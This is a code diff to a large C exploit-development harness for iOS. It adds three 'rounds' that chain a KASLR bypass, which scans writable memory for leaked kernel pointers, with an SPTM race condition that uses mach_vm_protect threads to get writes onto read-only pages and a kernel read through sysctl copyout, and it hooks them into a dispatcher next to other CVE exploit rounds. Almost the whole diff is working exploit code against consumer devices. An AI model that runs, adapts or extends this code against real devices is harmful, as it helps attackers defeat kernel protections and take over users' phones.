@@ -288,6 +288,9 @@ extern kern_return_t mach_vm_region_recurse(vm_map_t target_task,
     uint64_t *address, uint64_t *size, uint32_t *nesting_depth,
     vm_region_recurse_info_t info, mach_msg_type_number_t *infoCnt);
 
+extern kern_return_t mach_vm_write(
+    vm_map_t target_task, mach_vm_address_t address,
+    vm_offset_t data, mach_msg_type_number_t dataCnt);
 extern kern_return_t mach_vm_region(vm_map_t target_task,
     uint64_t *address, uint64_t *size, vm_region_flavor_t flavor,
     vm_region_info_t info, mach_msg_type_number_t *infoCnt,
@@ -31713,6 +31716,395 @@ static void r508_exploit(void) {
    Uses direct IOServiceOpen fallback with zero handle — no DYLD_INTERPOSE
    or Security.framework needed. Minimal test: if IOServiceOpen succeeds and
    any selector returns kernel pointers, the bug is alive. */
+/* ============================================================
+ * Round 516: KASLR bypass — scan RW VM regions for kernel pointers
+ * (asuka4scape Phase 1 port)
+ *
+ * SAFE: read-only scan, no writes, no crash risk.
+ * Uses placeholder segment bases from iOS 27.0 beta 6 / A15.
+ * On A20 Pro / 27.1 the bases will differ — this round checks
+ * whether ANY kernel pointers leak into RW regions at all.
+ * If pointers are found, re-extract correct bases from the
+ * iOS 27.1 A20 Pro kernelcache.
+ * ============================================================ */
+
+#define KASLR_KTEXT_BASE          0xFFFFFFF007004000ULL
+#define KASLR_KDATA_CONST_BASE    0xFFFFFFF007B80000ULL
+#define KASLR_KDATA_SPTM_BASE     0xFFFFFFF0080C4000ULL
+#define KASLR_KTEXT_EXEC_BASE     0xFFFFFFF008110000ULL
+#define KASLR_KTEXT_BOOT_EXEC     0xFFFFFFF00A98C000ULL
+#define KASLR_KDATA_BASE          0xFFFFFFF00ABD8000ULL
+#define KASLR_KLINKEDIT_BASE      0xFFFFFFF00AE98000ULL
+
+#define KASLR_KADDR_MIN     0xFFFFFFF000000000ULL
+#define KASLR_KADDR_MAX     0xFFFFFFF100000000ULL
+#define KASLR_MAX_SLIDE     0x4000000ULL
+
+static int kaslr_is_valid_kptr(uint64_t ptr) {
+    if (ptr == 0 || ptr == 0xFFFFFFFFFFFFFFFFULL || ptr == 0xFFFFFFFF00000000ULL) return 0;
+    if (ptr >= KASLR_KADDR_MIN && ptr < KASLR_KADDR_MAX) return 1;
+    if (ptr >= 0xFFFFFFE000000000ULL && ptr < 0xFFFFFFF000000000ULL) return 1;
+    return 0;
+}
+
+static void r516_kaslr_scan(void) {
+    rlog("=== Round 516: KASLR bypass — RW region kernel pointer scan ===\n");
+    rlog("Technique: asuka4scape Phase 1 port\n");
+    rlog("Segment bases: iOS 27.0b6/A15 placeholders (need re-extraction for A20 Pro/27.1)\n\n");
+
+    uint64_t segments[] = {
+        KASLR_KTEXT_BASE, KASLR_KDATA_CONST_BASE, KASLR_KDATA_SPTM_BASE,
+        KASLR_KTEXT_EXEC_BASE, KASLR_KTEXT_BOOT_EXEC, KASLR_KDATA_BASE,
+        KASLR_KLINKEDIT_BASE
+    };
+    int num_segments = sizeof(segments) / sizeof(segments[0]);
+
+    mach_vm_address_t addr = 0;
+    mach_vm_size_t size = 0;
+    vm_region_basic_info_data_64_t info;
+    mach_msg_type_number_t count;
+    mach_port_t obj = MACH_PORT_NULL;
+
+    int regions_scanned = 0;
+    int rw_regions = 0;
+    int pointers_found = 0;
+    int page_aligned_kptrs = 0;
+
+    /* slide candidate tracking — simple array approach */
+    #define MAX_SLIDE_CANDIDATES 256
+    uint64_t slide_vals[MAX_SLIDE_CANDIDATES];
+    int slide_counts[MAX_SLIDE_CANDIDATES];
+    int num_slides = 0;
+
+    rlog("Scanning all VM regions...\n");
+
+    while (1) {
+        count = VM_REGION_BASIC_INFO_COUNT_64;
+        kern_return_t kr = mach_vm_region(mach_task_self(), &addr, &size,
+            VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &count, &obj);
+        if (kr != KERN_SUCCESS) break;
+        regions_scanned++;
+
+        if (info.protection & VM_PROT_WRITE) {
+            rw_regions++;
+            /* Only scan regions up to 64MB to avoid huge scans */
+            if (size <= 0x4000000) {
+                volatile uint64_t *ptr = (volatile uint64_t *)addr;
+                uint64_t num_qwords = size / 8;
+                for (uint64_t i = 0; i < num_qwords; i++) {
+                    uint64_t val = ptr[i];
+                    if (!kaslr_is_valid_kptr(val)) continue;
+                    pointers_found++;
+
+                    if ((val & 0xFFF) == 0) {
+                        page_aligned_kptrs++;
+                        for (int s = 0; s < num_segments; s++) {
+                            if (val <= segments[s]) continue;
+                            uint64_t slide = val - segments[s];
+                            if (slide >= KASLR_MAX_SLIDE) continue;
+                            if ((slide & 0x1FFFFF) != 0) continue;
+                            /* Valid slide candidate — record it */
+                            int found = 0;
+                            for (int c = 0; c < num_slides; c++) {
+                                if (slide_vals[c] == slide) {
+                                    slide_counts[c]++;
+                                    found = 1;
+                                    break;
+                                }
+                            }
+                            if (!found && num_slides < MAX_SLIDE_CANDIDATES) {
+                                slide_vals[num_slides] = slide;
+                                slide_counts[num_slides] = 1;
+                                num_slides++;
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        addr += size;
+    }
+
+    rlog("\n--- Results ---\n");
+    rlog("Total VM regions scanned: %d\n", regions_scanned);
+    rlog("RW regions: %d\n", rw_regions);
+    rlog("Kernel pointers found: %d\n", pointers_found);
+    rlog("Page-aligned kernel pointers: %d\n", page_aligned_kptrs);
+    rlog("Slide candidates: %d\n", num_slides);
+
+    if (pointers_found > 0) {
+        rlog("\n>>> KERNEL POINTERS DETECTED IN RW REGIONS <<<\n");
+        rlog(">>> KASLR bypass technique is VIABLE on this device <<<\n\n");
+    } else {
+        rlog("\n>>> NO kernel pointers found — technique may be mitigated <<<\n\n");
+    }
+
+    /* Show top slide candidates */
+    if (num_slides > 0) {
+        rlog("Top slide candidates (using A15/27.0b6 bases — may not match A20 Pro):\n");
+        /* Find best */
+        int best_idx = 0;
+        for (int c = 1; c < num_slides; c++) {
+            if (slide_counts[c] > slide_counts[best_idx]) best_idx = c;
+        }
+        for (int c = 0; c < num_slides && c < 10; c++) {
+            rlog("  slide=0x%llx count=%d%s\n", slide_vals[c], slide_counts[c],
+                 c == best_idx ? " <<< BEST" : "");
+        }
+        if (slide_counts[best_idx] >= 2) {
+            rlog("\nBest slide: 0x%llx (%d confirmations)\n", slide_vals[best_idx], slide_counts[best_idx]);
+            rlog("Kernel __TEXT runtime (placeholder): 0x%llx\n",
+                 KASLR_KTEXT_BASE + slide_vals[best_idx]);
+            rlog("NOTE: These addresses use A15/27.0b6 bases.\n");
+            rlog("      Re-extract bases from A20 Pro/27.1 kernelcache for correct values.\n");
+        }
+    }
+
+    /* Also dump raw kernel pointer samples for analysis */
+    rlog("\nFirst 20 raw kernel pointers found in RW regions:\n");
+    addr = 0; size = 0;
+    int sample_count = 0;
+    while (sample_count < 20) {
+        count = VM_REGION_BASIC_INFO_COUNT_64;
+        kern_return_t kr = mach_vm_region(mach_task_self(), &addr, &size,
+            VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &count, &obj);
+        if (kr != KERN_SUCCESS) break;
+        if (info.protection & VM_PROT_WRITE && size <= 0x4000000) {
+            volatile uint64_t *ptr = (volatile uint64_t *)addr;
+            uint64_t num_qwords = size / 8;
+            for (uint64_t i = 0; i < num_qwords && sample_count < 20; i++) {
+                uint64_t val = ptr[i];
+                if (kaslr_is_valid_kptr(val)) {
+                    rlog("  [region 0x%llx+0x%llx] offset 0x%llx = 0x%llx%s\n",
+                         (uint64_t)addr, (uint64_t)size, i * 8, val,
+                         (val & 0xFFF) == 0 ? " (page-aligned)" : "");
+                    sample_count++;
+                }
+            }
+        }
+        addr += size;
+    }
+
+    rlog("\n=== Round 516 complete ===\n");
+}
+
+/* ============================================================
+ * Round 517: SPTM race sanity check
+ * (asuka4scape Phase 2 port)
+ *
+ * MEDIUM RISK: CPU-intensive, may trigger watchdog.
+ * Tests whether the SPTM shared-lock race condition is alive
+ * on iOS 27.1. Two threads race vm_protect on the same page.
+ * Main thread attempts vm_write to read-only page.
+ * If ANY vm_write succeeds → SPTM race is CONFIRMED ALIVE.
+ * ============================================================ */
+
+#define SPTM_RACE_ATTEMPTS     1000
+#define SPTM_RACE_USLEEP       10
+#define SPTM_WATCHDOG_USLEEP   100
+
+typedef struct {
+    volatile mach_vm_address_t page;
+    volatile int running;
+    int core;
+} sptm_race_ctx_t;
+
+static void sptm_pin_to_core(int core) {
+    thread_affinity_policy_data_t policy = { core + 1 };
+    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
+                      (thread_policy_t)&policy, 1);
+}
+
+static void *sptm_read_thread(void *arg) {
+    sptm_race_ctx_t *ctx = (sptm_race_ctx_t *)arg;
+    sptm_pin_to_core(ctx->core);
+    while (ctx->running) {
+        mach_vm_protect(mach_task_self(), ctx->page, PAGE_SIZE, 0, VM_PROT_READ);
+        usleep(SPTM_RACE_USLEEP);
+    }
+    return NULL;
+}
+
+static void *sptm_write_thread(void *arg) {
+    sptm_race_ctx_t *ctx = (sptm_race_ctx_t *)arg;
+    sptm_pin_to_core(ctx->core);
+    while (ctx->running) {
+        mach_vm_protect(mach_task_self(), ctx->page, PAGE_SIZE, 0,
+                        VM_PROT_READ | VM_PROT_WRITE);
+        usleep(SPTM_RACE_USLEEP);
+    }
+    return NULL;
+}
+
+static void r517_sptm_race(void) {
+    rlog("=== Round 517: SPTM race sanity check ===\n");
+    rlog("Technique: asuka4scape Phase 2 port\n");
+    rlog("Bug: sptm_stability_hacks=0 → shared lock in pmap_protect/pmap_enter\n");
+    rlog("Expected success rate: ~12.5%% per attempt\n\n");
+
+    /* Allocate a page, set max_protection to RW, then current to READ-only */
+    mach_vm_address_t page = 0;
+    kern_return_t kr = mach_vm_allocate(mach_task_self(), &page, PAGE_SIZE, VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) {
+        rlog("FAILED: mach_vm_allocate returned 0x%x\n", kr);
+        return;
+    }
+    /* Set max protection to RW so vm_protect can toggle */
+    kr = mach_vm_protect(mach_task_self(), page, PAGE_SIZE, 1 /* set_maximum */,
+                         VM_PROT_READ | VM_PROT_WRITE);
+    if (kr != KERN_SUCCESS) {
+        rlog("FAILED: set max protection returned 0x%x\n", kr);
+        mach_vm_deallocate(mach_task_self(), page, PAGE_SIZE);
+        return;
+    }
+    /* Zero the page while writable */
+    memset((void *)page, 0, PAGE_SIZE);
+    /* Set current protection to READ-only */
+    kr = mach_vm_protect(mach_task_self(), page, PAGE_SIZE, 0, VM_PROT_READ);
+    if (kr != KERN_SUCCESS) {
+        rlog("FAILED: set read-only returned 0x%x\n", kr);
+        mach_vm_deallocate(mach_task_self(), page, PAGE_SIZE);
+        return;
+    }
+
+    rlog("Allocated READ-only page at 0x%llx\n", (uint64_t)page);
+    rlog("Starting race threads (core 0 / core 1)...\n");
+
+    sptm_race_ctx_t ctx_a = { .page = page, .running = 1, .core = 0 };
+    sptm_race_ctx_t ctx_b = { .page = page, .running = 1, .core = 1 };
+    pthread_t thread_a, thread_b;
+    pthread_create(&thread_a, NULL, sptm_read_thread, &ctx_a);
+    pthread_create(&thread_b, NULL, sptm_write_thread, &ctx_b);
+
+    rlog("Racing %d vm_write attempts...\n", SPTM_RACE_ATTEMPTS);
+
+    int successes = 0;
+    uint32_t test_val = 0xDEADBEEF;
+    for (int i = 0; i < SPTM_RACE_ATTEMPTS; i++) {
+        kr = mach_vm_write(mach_task_self(), page, (vm_offset_t)&test_val, 4);
+        if (kr == KERN_SUCCESS) {
+            successes++;
+            if (successes <= 5) {
+                rlog("  [attempt %d] vm_write SUCCEEDED on READ-only page!\n", i);
+            }
+        }
+        usleep(SPTM_WATCHDOG_USLEEP);
+    }
+
+    /* Stop race threads */
+    ctx_a.running = 0;
+    ctx_b.running = 0;
+    pthread_join(thread_a, NULL);
+    pthread_join(thread_b, NULL);
+
+    /* Restore page to writable for cleanup */
+    mach_vm_protect(mach_task_self(), page, PAGE_SIZE, 0, VM_PROT_READ | VM_PROT_WRITE);
+
+    /* Check if test value was actually written */
+    uint32_t readback = *(volatile uint32_t *)page;
+
+    mach_vm_deallocate(mach_task_self(), page, PAGE_SIZE);
+
+    rlog("\n--- Results ---\n");
+    rlog("vm_write successes: %d / %d (%.1f%%)\n",
+         successes, SPTM_RACE_ATTEMPTS, (float)successes / SPTM_RACE_ATTEMPTS * 100.0f);
+    rlog("Page readback: 0x%08x (expect 0xDEADBEEF if write landed)\n", readback);
+
+    if (successes > 0) {
+        rlog("\n>>> SPTM RACE IS ALIVE ON THIS DEVICE <<<\n");
+        rlog(">>> sptm_stability_hacks=0 CONFIRMED <<<\n");
+        rlog(">>> PTE write primitive available with ~%.1f%% success rate <<<\n",
+             (float)successes / SPTM_RACE_ATTEMPTS * 100.0f);
+    } else {
+        rlog("\n>>> SPTM race FAILED — sptm_stability_hacks may be 1 on iOS 27.1 <<<\n");
+        rlog(">>> Or core affinity not working as expected on A20 Pro <<<\n");
+    }
+
+    rlog("\n=== Round 517 complete ===\n");
+}
+
+/* ============================================================
+ * Round 518: Kernel string read via SPTM race + sysctl copyout
+ * (asuka4scape Phase 3 port)
+ *
+ * REQUIRES: Round 517 success (SPTM race alive)
+ * Tests kernel read primitive — sysctlbyname copyout to a
+ * READ-only page during the SPTM race window.
+ * ============================================================ */
+
+#define SYSCTL_RACE_ATTEMPTS 2000
+
+static void r518_sptm_kernel_read(void) {
+    rlog("=== Round 518: Kernel string read via SPTM race + sysctl copyout ===\n");
+    rlog("Technique: asuka4scape Phase 3 port\n");
+    rlog("Goal: Read kernel strings onto READ-only page during race window\n\n");
+
+    mach_vm_address_t page = 0;
+    kern_return_t kr = mach_vm_allocate(mach_task_self(), &page, PAGE_SIZE, VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) { rlog("FAILED: alloc 0x%x\n", kr); return; }
+    kr = mach_vm_protect(mach_task_self(), page, PAGE_SIZE, 1, VM_PROT_READ | VM_PROT_WRITE);
+    if (kr != KERN_SUCCESS) { rlog("FAILED: max prot 0x%x\n", kr); goto r518_cleanup; }
+    memset((void *)page, 0, PAGE_SIZE);
+    kr = mach_vm_protect(mach_task_self(), page, PAGE_SIZE, 0, VM_PROT_READ);
+    if (kr != KERN_SUCCESS) { rlog("FAILED: set RO 0x%x\n", kr); goto r518_cleanup; }
+
+    rlog("READ-only page at 0x%llx\n", (uint64_t)page);
+    rlog("Starting SPTM race threads...\n");
+
+    sptm_race_ctx_t ctx_a = { .page = page, .running = 1, .core = 0 };
+    sptm_race_ctx_t ctx_b = { .page = page, .running = 1, .core = 1 };
+    pthread_t thread_a, thread_b;
+    pthread_create(&thread_a, NULL, sptm_read_thread, &ctx_a);
+    pthread_create(&thread_b, NULL, sptm_write_thread, &ctx_b);
+
+    /* Try multiple sysctl keys */
+    const char *sysctl_keys[] = {
+        "kern.osversion", "kern.version", "kern.bootsessionuuid", NULL
+    };
+
+    for (int k = 0; sysctl_keys[k] != NULL; k++) {
+        rlog("\nTrying sysctlbyname(\"%s\") x%d...\n", sysctl_keys[k], SYSCTL_RACE_ATTEMPTS);
+        int got_data = 0;
+        char result[256] = {0};
+
+        for (int i = 0; i < SYSCTL_RACE_ATTEMPTS; i++) {
+            /* Zero the page — need vm_write to succeed during race */
+            uint64_t zero = 0;
+            mach_vm_write(mach_task_self(), page, (vm_offset_t)&zero, 8);
+
+            size_t sz = 255;
+            int err = sysctlbyname(sysctl_keys[k], (void *)page, &sz, NULL, 0);
+            if (err == 0) {
+                volatile char *ptr = (volatile char *)page;
+                if (ptr[0] != 0) {
+                    size_t cpysz = sz < 255 ? sz : 255;
+                    memcpy(result, (void *)page, cpysz);
+                    result[cpysz] = 0;
+                    got_data = 1;
+                    rlog("  [attempt %d] COPYOUT SUCCEEDED: \"%s\"\n", i, result);
+                    break;
+                }
+            }
+            usleep(50);
+        }
+
+        if (!got_data) {
+            rlog("  No data received for %s\n", sysctl_keys[k]);
+        }
+    }
+
+    ctx_a.running = 0;
+    ctx_b.running = 0;
+    pthread_join(thread_a, NULL);
+    pthread_join(thread_b, NULL);
+
+r518_cleanup:
+    mach_vm_protect(mach_task_self(), page, PAGE_SIZE, 0, VM_PROT_READ | VM_PROT_WRITE);
+    mach_vm_deallocate(mach_task_self(), page, PAGE_SIZE);
+
+    rlog("\n=== Round 518 complete ===\n");
+}
+
 static void aks_kaslr_probe(void) {
     rlog("=== CVE-2026-65343: AppleKeyStore OOB read → KASLR probe ===\n\n");
 
@@ -102763,6 +103155,24 @@ new_modes:
             rlog("*** rounds=485: CVE-2026-112477 adapted + SurfHeist + property race ***\n\n");
             fflush(stdout);
             r484_exploit();
+            goto done;
+        }
+        if (rounds == 518) {
+            rlog("*** rounds=518: SPTM race kernel string read (asuka4scape Phase 3) ***\n\n");
+            fflush(stdout);
+            r518_sptm_kernel_read();
+            goto done;
+        }
+        if (rounds == 517) {
+            rlog("*** rounds=517: SPTM race sanity check (asuka4scape Phase 2) ***\n\n");
+            fflush(stdout);
+            r517_sptm_race();
+            goto done;
+        }
+        if (rounds == 516) {
+            rlog("*** rounds=516: KASLR bypass RW region scan (asuka4scape Phase 1) ***\n\n");
+            fflush(stdout);
+            r516_kaslr_scan();
             goto done;
         }
         if (rounds == 515) {
